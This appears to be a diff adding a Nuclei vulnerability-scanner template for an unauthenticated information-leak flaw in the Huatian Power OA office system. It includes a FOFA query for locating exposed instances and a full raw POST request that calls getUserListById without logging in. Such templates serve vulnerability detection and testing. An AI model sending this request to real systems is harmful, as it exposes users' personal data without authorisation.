@@ -1,0 +1,43 @@
+id: htpower-oa-unauthorized-access
+
+info:
+  name: 华天动力OA办公系统未授权访问信息泄露漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app:"华天动力 OA"
+      该漏洞允许远程攻击者在未进行身份验证的情况下访问受限资源，可能导致敏感信息泄露。
+  tags: 华天动力OA办公系统存在未授权访问漏洞
+
+http:
+- raw:
+  - |
+    POST /OAapp/bfapp/buffalo/hrApplicationFormService HTTP/1.1
+    Host: {{Hostname}}
+    Pragma: no-cache
+    Accept: application/json, text/plain, */*
+    Cache-Control: no-cache
+    Content-Type: text/xml;charset=utf-8
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: zh-CN,zh;q=0.9
+    Cookie: JSESSIONID=E23F65531C015A84CE70FBBEAFDA5296
+    Connection: close
+
+       <buffalo-call>
+            <method>getUserListById</method>
+            <boolean>1</boolean>
+            <string></string>
+            <string>2</string>
+            <string></string>
+            <string></string>
+            <boolean>1</boolean>
+            <boolean>1</boolean>
+       </buffalo-call>
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'buffalo-reply'
